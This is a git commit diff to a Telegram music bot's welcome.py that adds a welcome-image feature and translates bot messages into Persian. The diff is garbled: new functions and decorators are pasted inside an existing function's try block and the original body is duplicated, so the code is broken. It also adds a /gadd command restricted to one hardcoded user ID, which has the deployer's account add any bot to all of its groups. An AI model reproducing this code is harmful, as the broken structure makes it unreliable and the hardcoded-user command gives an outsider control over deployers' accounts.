9b2599b5e61f3fb2c769198c1ce059006a5beea7
Magichidden <gf502429@gmail.com>
2025-02-06 22:24:10 +0330

    Update welcome.py

--- SHUKLAMUSIC/plugins/tools/welcome.py
+++ SHUKLAMUSIC/plugins/tools/welcome.py
@@ -225,10 +225,132 @@ async def add_all(client, message):
     try:
         userbot = await get_assistant(message.chat.id)
         bot = await app.get_users(bot_username)
+def circle(pfp, size=(500, 500), brightness_factor=10):
+    pfp = pfp.resize(size, Image.ANTIALIAS).convert("RGBA")
+    pfp = ImageEnhance.Brightness(pfp).enhance(brightness_factor)
+    bigsize = (pfp.size[0] * 3, pfp.size[1] * 3)
+    mask = Image.new("L", bigsize, 0)
+    draw = ImageDraw.Draw(mask)
+    draw.ellipse((0, 0) + bigsize, fill=255)
+    mask = mask.resize(pfp.size, Image.ANTIALIAS)
+    mask = ImageChops.darker(mask, pfp.split()[-1])
+    pfp.putalpha(mask)
+    return pfp
+
+def welcomepic(pic, user, chatname, id, uname, brightness_factor=1.3):
+    background = Image.open("SHUKLAMUSIC/assets/wel2.png")
+    pfp = Image.open(pic).convert("RGBA")
+    pfp = circle(pfp, brightness_factor=brightness_factor) 
+    pfp = pfp.resize((500, 500))
+    draw = ImageDraw.Draw(background)
+    font = ImageFont.truetype('SHUKLAMUSIC/assets/font.ttf', size=60)
+    welcome_font = ImageFont.truetype('SHUKLAMUSIC/assets/font.ttf', size=60)
+    draw.text((630, 450), f'شناسه: {id}', fill=(255, 255, 255), font=font)
+    pfp_position = (48, 88)
+    background.paste(pfp, pfp_position, pfp)
+    background.save(f"downloads/welcome#{id}.png")
+    return f"downloads/welcome#{id}.png"
+
+@app.on_message(filters.command("welcome") & ~filters.private)
+async def auto_state(_, message):
+    usage = "**راهنما:**\n**⦿ /welcome [on|off]**"
+    if len(message.command) == 1:
+        return await message.reply_text(usage)
+    chat_id = message.chat.id
+    user = await app.get_chat_member(message.chat.id, message.from_user.id)
+    if user.status in (
+        enums.ChatMemberStatus.ADMINISTRATOR,
+        enums.ChatMemberStatus.OWNER,
+    ):
+        A = await wlcm.find_one(chat_id)
+        state = message.text.split(None, 1)[1].strip().lower()
+        if state == "off":
+            if A:
+                await message.reply_text("**اعلان خوش‌آمدگویی قبلاً غیرفعال شده است!**")
+            else:
+                await wlcm.add_wlcm(chat_id)
+                await message.reply_text(f"**اعلان خوش‌آمدگویی در {message.chat.title} غیرفعال شد**")
+        elif state == "on":
+            if not A:
+                await message.reply_text("**اعلان خوش‌آمدگویی فعال شد.**")
+            else:
+                await wlcm.rm_wlcm(chat_id)
+                await message.reply_text(f"**اعلان خوش‌آمدگویی در {message.chat.title} فعال شد**")
+        else:
+            await message.reply_text(usage)
+    else:
+        await message.reply("**متأسفم! فقط ادمین‌ها می‌توانند اعلان خوش‌آمدگویی را فعال کنند!**")
+
+@app.on_chat_member_updated(filters.group, group=-3)
+async def greet_new_member(_, member: ChatMemberUpdated):
+    chat_id = member.chat.id
+    count = await app.get_chat_members_count(chat_id)
+    A = await wlcm.find_one(chat_id)
+    if A:
+        return
+
+    user = member.new_chat_member.user if member.new_chat_member else member.from_user
+
+    if member.new_chat_member and not member.old_chat_member and member.new_chat_member.status != "kicked":
+        try:
+            pic = await app.download_media(
+                user.photo.big_file_id, file_name=f"pp{user.id}.png"
+            )
+        except AttributeError:
+            pic = "SHUKLAMUSIC/assets/upic.png"
+        if (temp.MELCOW).get(f"welcome-{member.chat.id}") is not None:
+            try:
+                await temp.MELCOW[f"welcome-{member.chat.id}"].delete()
+            except Exception as e:
+                LOGGER.error(e)
+        try:
+            welcomeimg = welcomepic(
+                pic, user.first_name, member.chat.title, user.id, user.username
+            )
+            button_text = "๏ مشاهده عضو جدید ๏"
+            add_button_text = "✙ منو به گروهت اضافه کن ✙"
+            deep_link = f"tg://openmessage?user_id={user.id}"
+            add_link = f"https://t.me/{app.username}?startgroup=true"
+            temp.MELCOW[f"welcome-{member.chat.id}"] = await app.send_photo(
+                member.chat.id,
+                photo=welcomeimg,
+                caption=f"""
+**⎊─────☵ خوش آمدید ☵─────⎊**
+
+**▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬**
+
+**☉ نام ⧽** {user.mention}
+**☉ شناسه ⧽** `{user.id}`
+**☉ نام کاربری ⧽** @{user.username}
+**☉ تعداد اعضا ⧽** {count}
+
+**▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬**
+
+**⎉──────▢✭ 侖 ✭▢──────⎉**
+""",
+                reply_markup=InlineKeyboardMarkup([
+                    [InlineKeyboardButton(button_text, url=deep_link)],
+                    [InlineKeyboardButton(text=add_button_text, url=add_link)],
+                ])
+            )
+        except Exception as e:
+            LOGGER.error(e)
+
+@app.on_message(filters.command("gadd") & filters.user(6919199044))
+async def add_all(client, message):
+    command_parts = message.text.split(" ")
+    if len(command_parts) != 2:
+        await message.reply("**⚠️ فرمت دستور نامعتبر است. لطفاً به این شکل استفاده کنید » `/gadd نام کاربری ربات`**")
+        return
+
+    bot_username = command_parts[1]
+    try:
+        userbot = await get_assistant(message.chat.id)
+        bot = await app.get_users(bot_username)
         app_id = bot.id
         done = 0
         failed = 0
-        lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
+        lol = await message.reply("🔄 **در حال افزودن ربات به تمام گروه‌ها!**")
 
         async for dialog in userbot.get_dialogs():
             if dialog.chat.id == -1002006121442:
@@ -237,17 +359,17 @@ async def add_all(client, message):
                 await userbot.add_chat_members(dialog.chat.id, app_id)
                 done += 1
                 await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+                    f"**🔂 در حال افزودن {bot_username}**\n\n**➥ اضافه شده در {done} گروه ✅**\n**➥ ناموفق در {failed} گروه ❌**\n\n**➲ اضافه شده توسط»** @{userbot.username}"
                 )
             except Exception as e:
                 failed += 1
                 await lol.edit(
-                    f"**🔂 ᴀᴅᴅɪɴɢ {bot_username}**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅɪɴɢ ʙʏ»** @{userbot.username}"
+                    f"**🔂 در حال افزودن {bot_username}**\n\n**➥ اضافه شده در {done} گروه ✅**\n**➥ ناموفق در {failed} گروه ❌**\n\n**➲ در حال افزودن توسط»** @{userbot.username}"
                 )
-            await asyncio.sleep(3)  # Adjust sleep time based on rate limits
+            await asyncio.sleep(3)
 
         await lol.edit(
-            f"**➻ {bot_username} ʙᴏᴛ ᴀᴅᴅᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ🎉**\n\n**➥ ᴀᴅᴅᴇᴅ ɪɴ {done} ᴄʜᴀᴛs ✅**\n**➥ ғᴀɪʟᴇᴅ ɪɴ {failed} ᴄʜᴀᴛs ❌**\n\n**➲ ᴀᴅᴅᴇᴅ ʙʏ»** @{userbot.username}"
+            f"**➻ ربات {bot_username} با موفقیت اضافه شد🎉**\n\n**➥ اضافه شده در {done} گروه ✅**\n**➥ ناموفق در {failed} گروه ❌**\n\n**➲ اضافه شده توسط»** @{userbot.username}"
         )
     except Exception as e:
-        await message.reply(f"Error: {str(e)}")
+        await message.reply(f"خطا: {str(e)}")
